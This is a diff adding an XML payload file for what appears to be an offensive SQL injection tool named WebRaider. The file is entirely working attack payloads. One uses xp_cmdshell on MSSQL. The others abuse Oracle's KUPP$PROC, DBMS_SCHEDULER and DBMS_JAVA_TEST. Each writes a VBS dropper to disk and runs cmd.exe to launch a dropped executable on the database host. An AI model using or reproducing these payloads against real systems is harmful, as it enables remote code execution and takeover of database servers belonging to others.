@@ -1,0 +1,28 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<xml>
+
+  <!--
+ - {PAYLOAD} will be added by WebRaider.
+ - Query termination should be handled on attack patterns. WebRaider will not add anything to the end of attacks.
+ - WebRaider will start attacks with "id=1 and .." or "id=1' and .." according to the choice from Options menu.
+-->
+  <payload name="MSSQL - One Click Ownage">
+    <attack encoded="false" consoleencoding="true">
+      <![CDATA[exec master..xp_cmdshell 'echo {PAYLOAD}>p.vbs && p.vbs && %TEMP%\wr.exe';--]]>
+    </attack>
+  </payload>
+
+  <payload name="ORACLE - DBA Privs">
+    <attack encoded="false" consoleencoding="false">
+      <![CDATA[(SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('BEGIN EXECUTE IMMEDIATE ''create or replace procedure pr(p in varchar2,fn in varchar2,l in nvarchar2) is o_f utl_file.file_type; begin o_f:=utl_file.fopen(p,fn,''''W'''',4000);utl_file.put_line(o_f,l);utl_file.fclose(o_f);end;'';execute immediate ''create or replace directory T as ''''C:\'''''';pr(''T'',''x.vbs'',''{PAYLOAD}'');DBMS_SCHEDULER.create_program(''bb'', ''EXECUTABLE'', ''c:\WINDOWS\system32\cmd.exe /c copy C:\x.vbs %TEMP% /y&&%TEMP%\x.vbs&&%TEMP%\wr.exe'',0,TRUE);DBMS_SCHEDULER.create_job(''au'',''bb'',enabled=>TRUE);END;') from dual) is not null-- ]]>
+    </attack>
+  </payload>
+
+  <payload name="ORACLE - Java">
+    <attack encoded="false" consoleencoding="true">
+      <![CDATA[(Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','echo {PAYLOAD}>%TEMP%\bsqlbf.vbs&&%TEMP%\bsqlbf.vbs&&%TEMP%\wr.exe') FROM DUAL) is not null-- ]]>
+    </attack>
+  </payload>
+
+
+</xml>
